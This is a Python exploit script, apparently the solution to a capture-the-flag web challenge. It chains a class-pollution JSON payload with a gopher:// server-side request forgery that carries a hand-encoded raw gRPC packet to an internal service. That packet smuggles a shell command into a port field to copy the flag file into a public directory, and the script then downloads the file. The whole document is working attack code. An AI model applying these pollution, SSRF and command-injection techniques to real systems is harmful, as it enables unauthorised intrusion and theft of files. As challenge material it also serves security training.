import requests

HOST, PORT = "127.0.0.1", 1337
CHALLENGE_URL = f"http://{HOST}:{PORT}"

def connect_ream(session):
	try:
		session.get(f"{CHALLENGE_URL}/connect-realm", timeout=2)
	except requests.exceptions.ReadTimeout:
		pass

def merge_fates(session):
	session.post(f"{CHALLENGE_URL}/merge-fates", json=class_pollution())

def class_pollution():
	payload = {
		"class": {
			"superclass": {
				"realm_url": grpc_packet()
			}
		}
	}
	return payload

def grpc_packet():
	# sniffed using tcpdump https://bkubiak.github.io/grpc-raw-requests/
	# grpcurl -plaintext -proto live_data.proto -d '{"ip": "127.0.0.1", "port": "1337; cp /flag* /app/eldoria_api/public/flag.txt"}' localhost:50051 live.LiveDataService/CheckHealth
	magic = "505249202a20485454502f322e300d0a0d0a534d0d0a0d0a"
	settings = "000000040100000000"
	headers = "00007c010400000001838645986283772af9cddcb7c691ee2d9dcc42b17a7293ae328e84cf418ba0e41d139d09b8d800d87f5f8b1d75d0620d263d4c4d65647aa59acac96d9431217bad1da6a2453faa8ea772d8831ea51054ff6a4d65645a63b015db75707f40027465864d833505b11f408e9acac8b0c842d6958b510f21aa9b839bd9ab"
	data = "000042000100000001000000003d0a093132372e302e302e311230313333373b206370202f666c61672a202f6170702f656c646f7269615f6170692f7075626c69632f666c61672e747874"

	packet = magic + settings + headers + data

	encoded_packet = ""
	for i in range(int(len(packet) / 2)):
		encoded_packet += "%" + packet[2*i:2*(i+1)]

	return f"gopher://127.0.0.1:50051/_{encoded_packet}"

def get_flag():
	flag = requests.get(f"{CHALLENGE_URL}/flag.txt").text
	return flag

def pwn():
	session = requests.Session()
	merge_fates(session)
	connect_ream(session)

	print(get_flag())

def main():
	pwn()

if __name__ == "__main__":
	main()